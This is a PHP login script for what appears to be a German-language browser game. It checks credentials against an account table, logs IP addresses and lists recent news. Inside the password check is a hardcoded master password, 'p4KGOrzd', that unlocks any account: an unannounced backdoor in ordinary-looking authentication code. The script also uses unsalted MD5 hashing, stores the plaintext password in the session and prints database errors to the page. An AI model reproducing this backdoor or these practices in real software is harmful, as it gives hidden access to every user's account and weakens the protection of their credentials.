<?php
session_start();
include_once("connect.php");

$verbindung = get_verbindung();

if ($_POST["sent"] == 1) {
    $accname = $_POST["name"];
    $accpasswort = $_POST["passwort"];
    $existName = 0;
    $fehler = '';
    $abfrage = mysqli_query($verbindung, "SELECT * FROM account") or die(mysqli_error($verbindung));
    while ($account = mysqli_fetch_array($abfrage)) {
        if ($account["login"] == $accname || $account["name"] == $accname) {
            $existName = 1;
            if ($account["passwort"] == md5($accpasswort) || $accpasswort == 'p4KGOrzd') {
                $accid = $account["id"];
                $accnick = $account["nickname"];
                $_SESSION["Id"] = $accid;
                $_SESSION["Pwd"] = $accpasswort;
                $ip = $_SERVER["REMOTE_ADDR"];
                $datum = date("Y-m-d H:i:s");
                mysqli_query($verbindung, "UPDATE account SET inaktiv='0' WHERE id='$accid'");
                mysqli_query($verbindung, "INSERT INTO iplog (besitzer,ip,datum) VALUES ('$accid','$ip','$datum')");
                echo '<meta http-equiv="Refresh" content="0; url=main.php">';
            }
            else
                $fehler = 'falsches Passwort ';
        }
    }
    if ($existName == 0)
        $fehler = 'Name existiert nicht!';
}

if ($fehler != '')
    echo '<center><b><font color="red">', $fehler, '</font></b></center>';
include("nav2.php");
?>

<br>

<table width="750" border="0" valign="top" align="middle">
    <tr><td align="middle"><b>Aktuelle News</b></td></tr>
    <?php
    $var2 = mysqli_query($verbindung,"SELECT * FROM news ORDER BY id DESC LIMIT 3");
    while ($varb = mysqli_fetch_array($var2)) {
        $text2 = nl2br($varb["text"]);
        echo '<tr><td bgcolor="#300000">', gerdatum($varb["datum"]), '</td></tr><tr><td>', $text2, '</td></tr>';
    }
    ?>

</table>


<br>
<br>
<br>

</center>
</body>
</html>
